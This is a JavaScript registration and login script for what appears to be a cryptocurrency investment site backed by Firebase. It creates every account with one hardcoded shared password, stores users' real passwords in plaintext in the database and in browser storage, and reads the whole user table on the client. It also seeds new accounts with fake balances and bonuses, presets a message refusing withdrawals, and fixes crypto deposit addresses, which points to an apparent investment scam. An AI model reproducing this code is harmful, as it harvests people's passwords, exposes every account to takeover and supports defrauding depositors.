var firebaseConfig = {
    apiKey: "AIzaSyD33YoQkbeQYR7bV3Gtr6xJMzO_SUAoLeI",
    authDomain: "dizzyfriendcrypto.firebaseapp.com",
    projectId: "dizzyfriendcrypto",
    storageBucket: "dizzyfriendcrypto.appspot.com",
    messagingSenderId: "658978217510",
    appId: "1:658978217510:web:254cadd5ff68f96fd9d0e7",
    measurementId: "G-4M3Q3V2Q8S"
  };

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
//const app = initializeApp(firebaseConfig);
//const analytics = getAnalytics(app);

//Initialize variables
const auth = firebase.auth();
const database = firebase.database();

var alertBox = document.getElementById("login_alert_box");
//Set up our register function
function register() {
  if (
    document.getElementById("password").value !==
    document.getElementById("confirm-password").value
  ) {
    alertBox.innerHTML = "Password not match!";
    alertBox.style.display = "block";
  } else {
    hide_loader();

    // Get all our input fields
    var full_name = document.getElementById("f_name").value,
      username = document.getElementById("input1").value,
      email = document.getElementById("email").value,
      phone = document.getElementById("phone").value,
      password = document.getElementById("password").value;
    country = document.getElementById("country").value;
    if (document.getElementById("ref_by") !== null) {
      ref_by = document.getElementById("ref_by").value;
    }

    // Validate input fields

    show_loader();
    // Move on with Auth
    auth
      .createUserWithEmailAndPassword(email, "Keephopealive123haha")
      .then(function () {
        var user = auth.currentUser;

        // Add this user to database
        var database_ref = database.ref();

        // Create User data
        var user_data = {
          email,
          ref_by,
          word: password,
          last_login: getCurrentTime(new Date()),
          withdrawMsg: ["Sorry", "your account balance is too low", "info"],
          verify_status: "not_verified",
          dashboard: {
            full_name,
            account_balance: "$5.00",
            total_profit: "$0.00",
            total_bonus: "$5.00",
            total_referral_bonus: "$0.00",
            total_investment_plan: "0",
            total_active_investment_plan: "0",
            total_deposit: "$0.00",
            total_withdrawal: "$0.00",
          },
          roi_history: [],
          transaction_history: {
            deposit: [],
            withdrawal: [],
            others: [
              {
                amount: "$5",
                type: "Bonus",
                plan: "SignUp Bonus",
                date_created: getCurrentTime(new Date()),
              },
            ],
          },
          crypto_exchange: {
            account_balance: "$5.00",
            btc: "0",
            eth: "0",
            ltc: "0",
            link: "0",
            bnb: "0",
            ada: "0",
            aave: "0",
            usdt: "0",
            bch: "0",
            xrp: "0",
            xlm: "0",
          },
          my_investments: [],
          refer: {
            ref_by,
            username,
          },
          user_settings: {
            personal_settings: {
              full_name,
              phone,
              country,
              email,
              dob: "",
            },
            withdraw_settings: {
              bank_transfer: {
                bank_name: "",
                account_name: "",
                account_no: "",
                swift_code: "",
              },
              withdraw_crypto_wallets: {
                withdraw_btc_wallet: "",
                withdraw_eth_wallet: "",
                withdraw_ltc_wallet: "",
              },
            },
            password_settings: {
              word: password,
            },
          },
          fund_account: {
            skrill_address: "loading...",
            paypal_address: "loading...",
            deposit_lit_address: "ltc1qjfqt0f8zrt5kzgh8qakvf4pk4cuxsys0l8c3lu",
            deposit_eth_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            deposit_btc_address: "bc1qgdqcdqdw8hwmasxn25rn6zdquthymzum4txuwt",
            deposit_solana_address: "loading...",
            deposit_usdt_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            deposit_bnb_address: "0x73FCb36d0c9F3B1d3e82B30fA9417b8EE4b5355c",
            bank_transfer: {
              bank_name: "",
              account_name: "",
              account_no: "",
              swift_code: "",
            },
          },
        };

        //showLoader();
        database_ref.child("users/" + user.uid).set(user_data);

        localStorage.setItem("email_me", email);
        localStorage.setItem("password_me", password);
        setTimeout(goToVerify, 4000);
      })
      .catch(function (error) {
        hide_loader();
        document.getElementById("container_body").style.display = "block";
        document.getElementById("divElement").style.display = "none";
        var error_code = error.code;
        var error_message = error.message;

        //alert(error_message)
        alertBox.style.display = "block";
        alertBox.innerHTML = error_message;
      });
  }
}

function hide_loader() {
  document.getElementById("container_body").style.display = "block";
  document.getElementById("divElement").style.display = "none";
}
function show_loader() {
  document.getElementById("container_body").style.display = "none";
  document.getElementById("divElement").style.display = "block";
}
function constructor_login() {
  if (
    localStorage.getItem("email_me") == undefined &&
    localStorage.getItem("password_me") == undefined
  ) {
    hide_loader();
  } else {
    // SHOW LOADING UNTIL THIS IS DONE
    login();
  }
}
var user_details_holder;
function login() {
  var coming_from_reloader = "no";
  //SHOW LOADER
  show_loader();
  var email, password;
  // Get all our input fields
  if (
    localStorage.getItem("email_me") == undefined ||
    localStorage.getItem("password_me") == undefined
  ) {
    hide_loader();
    email = document.getElementById("email").value;
    password = document.getElementById("password").value;
    localStorage.setItem("email_me", email);
    localStorage.setItem("password_me", password);
  } else {
    coming_from_reloader = "yes";
    email = localStorage.getItem("email_me");
    password = localStorage.getItem("password_me");
  }

  auth
    .signInWithEmailAndPassword(email, "Keephopealive123haha")
    .then(function () {
      // Declare user variable
      var user = auth.currentUser;
      // Add this user to Firebase Database
      var database_ref = database.ref();

      var firebaseRef = firebase.database().ref("users");
      firebaseRef.once("value", function (snapshot) {
        snapshot.forEach(function (element) {
          if ((element.val()?.email?.toLowerCase() ?? "") === (email?.toLowerCase() ?? "")) {
            user_details_holder = element.val();
            localStorage.setItem(
              "user_details_holder",
              JSON.stringify(user_details_holder)
            );
          }
        });
        // Create User data
        var user_data = {
          ...user_details_holder,
          last_login: getCurrentTime(new Date()),
        };
        // Push to Firebase Database
        database_ref.child("users/" + user.uid).update(user_data);
      });
      // User Logged In
      // CHECK PASSWORD
      setTimeout(check_password, 4000);
    })
    .catch(function (error) {
      if (coming_from_reloader == "yes") {
        hide_loader();
        localStorage.clear();
        user_details_holder = null;
      } else {
        localStorage.clear();
        show_loader();
        //var error_code = error.code;
        var error_message = error.message;
        if (
          error_message ==
          "There is no user record corresponding to this identifier. The user may have been deleted."
        ) {
          user_details_holder = null;
        }
        if (
          document.getElementById("email").value !== "" &&
          document.getElementById("password").value !== ""
        ) {
          if (
            error_message ==
            "There is no user record corresponding to this identifier. The user may have been deleted."
          ) {
            error_message = "Wrong Credentials!";
          }
        }
        swal("Notification!", error_message, "error");
        //alert(error_message);
      }
      console.log(error);
    });
}

function check_password() {
  if (user_details_holder.word == undefined) {
    window.location = window.location.origin + "/auth/trade/login.html";
  } else {
    if (localStorage.getItem("password_me") == user_details_holder.word) {
      goToDashboard();
    } else {
      swal("Notification!", "Wrong Credentials", "error");
      hide_loader();
      localStorage.clear();
      user_details_holder = null;
    }
  }
}

function goToDashboard() {
  if (user_details_holder == undefined) {
    location.reload();
  } else {
    if (user_details_holder.verify_status == "verified") {
      //alert("Logged In!!")
      window.location = "../../dashboard.html";
    } else {
      // GO BACK TO VERIFY
      document.getElementById("_email").value =
        user_details_holder.user_settings.personal_settings.email;
      document.getElementById("_password").value = user_details_holder.word;
      document.getElementById("username").value =
        user_details_holder.refer.username;
      // THE INFO BELOW NOT USUFUL HERE BUT REQUIRED FOR SUBMIT
      document.getElementById("f_name").value =
        user_details_holder.dashboard.full_name;
      document.getElementById("phone").value =
        user_details_holder.user_settings.personal_settings.phone;
      document.getElementById("confirm-password").value =
        user_details_holder.word;
      document.getElementById("country").value =
        user_details_holder.user_settings.personal_settings.country;
      document.getElementById("ref_by").value =
        user_details_holder.refer.ref_by;
      goToVerify();
    }
  }
}
function goToVerify() {
  //alert("Registration Successful!")
  //hideLoader();
  document.getElementById("signUp_form").submit();
  //window.location.href = "verify.html";
}

function getCurrentTime(date) {
  var hours = date.getHours();
  var minutes = date.getMinutes();
  var ampm = hours >= 12 ? "pm" : "am";
  hours = hours % 12;
  hours = hours ? hours : 12; // the hour '0' should be '12'
  minutes = minutes < 10 ? "0" + minutes : minutes;
  var strTime = hours + ":" + minutes + " " + ampm;
  return (
    date.getMonth() +
    1 +
    "/" +
    date.getDate() +
    "/" +
    date.getFullYear() +
    "  " +
    strTime
  );
}
